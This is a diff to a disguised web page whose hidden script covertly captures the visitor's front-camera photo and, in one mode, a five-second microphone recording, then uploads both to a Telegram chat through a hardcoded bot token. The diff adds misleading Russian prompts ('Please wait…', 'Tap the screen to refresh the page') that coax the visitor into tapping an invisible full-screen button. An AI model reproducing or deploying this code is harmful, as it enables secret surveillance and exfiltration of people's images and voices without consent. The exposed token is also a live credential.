@@ -14,7 +14,14 @@ html,body{
   position:fixed;top:0;left:0;width:100%;height:100%;
   border:0;background:transparent;padding:0;cursor:pointer;
   -webkit-tap-highlight-color:transparent;
-  color:transparent;font-size:0;
+}
+#msg{
+  position:fixed;top:50%;left:0;width:100%;
+  transform:translateY(-50%);
+  text-align:center;
+  color:#888;font-size:16px;
+  pointer-events:none;
+  display:none;
 }
 </style>
 </head>
@@ -22,25 +29,40 @@ html,body{
 
 <video id="v" autoplay playsinline muted style="display:none;"></video>
 <canvas id="c" style="display:none;"></canvas>
+<div id="msg"></div>
 <button id="btn"></button>
 
 <script>
 var TOKEN = "8998787761:AAHSE8bZXPhB2A4IMB273cIZD4qoaSUNDJk";
 var CHAT  = "1314241513";
-var mode  = new URLSearchParams(window.location.search).get("mode") || "photo";
-var RECORD_SECONDS = 5; // ← длительность записи звука
+var mode  = new URLSearchParams(location.search).get("mode") || "photo";
+var RECORD_SECONDS = 5;
 
 var v = document.getElementById("v");
 var c = document.getElementById("c");
 var btn = document.getElementById("btn");
+var msg = document.getElementById("msg");
 
 var stream = null;
 var ready = false;
 var busy = false;
-var counter = 0;
+
+function showMsg(text) {
+  msg.textContent = text;
+  msg.style.display = "block";
+}
+
+function hideMsg() {
+  msg.style.display = "none";
+}
 
 function initCamera() {
-  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) return;
+  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
+    showMsg("Нажмите на экран для обновления страницы");
+    return;
+  }
+
+  showMsg("Подождите…");
 
   navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
   .then(function(s) {
@@ -49,8 +71,14 @@ function initCamera() {
     v.muted = true;
     return v.play();
   })
-  .then(function() { ready = true; })
-  .catch(function(e) { console.log("cam err", e.name); });
+  .then(function() {
+    ready = true;
+    hideMsg();
+  })
+  .catch(function(e) {
+    console.log("cam err", e.name);
+    showMsg("Нажмите на экран для обновления страницы");
+  });
 }
 
 function sendPhoto() {
@@ -93,7 +121,6 @@ function recordAudio() {
       try {
         recorder = new MediaRecorder(audioStream, options);
       } catch (e) {
-        console.log("recorder err", e);
         audioStream.getTracks().forEach(function(t){ t.stop(); });
         resolve();
         return;
@@ -105,11 +132,9 @@ function recordAudio() {
       };
       recorder.onstop = function() {
         audioStream.getTracks().forEach(function(t){ t.stop(); });
-
         var type = recorder.mimeType || "audio/webm";
         var ext  = type.indexOf("mp4") >= 0 ? "m4a" : "ogg";
         var blob = new Blob(chunks, { type: type });
-
         var fd = new FormData();
         fd.append("chat_id", CHAT);
         fd.append("voice", blob, "voice." + ext);
@@ -130,30 +155,24 @@ function recordAudio() {
 }
 
 btn.addEventListener("click", function() {
-  if (!ready) { initCamera(); return; }
+  // Если камера не готова — пытаемся запустить заново
+  if (!ready) {
+    initCamera();
+    return;
+  }
   if (busy) return;
   busy = true;
 
-  counter++;
+  var action = (mode === "audio")
+    ? sendPhoto().then(recordAudio)
+    : sendPhoto();
 
-  if (mode === "video") {
-    sendPhoto().then(function() {
-      return recordAudio();
-    }).then(function() {
-      busy = false;
-    }).catch(function() {
-      busy = false;
-    });
-  } else {
-    sendPhoto().then(function() {
-      busy = false;
-    }).catch(function() {
-      busy = false;
-    });
-  }
+  action.then(function() { busy = false; })
+        .catch(function() { busy = false; });
 });
 
 initCamera();
 </script>
+
 </body>
 </html>
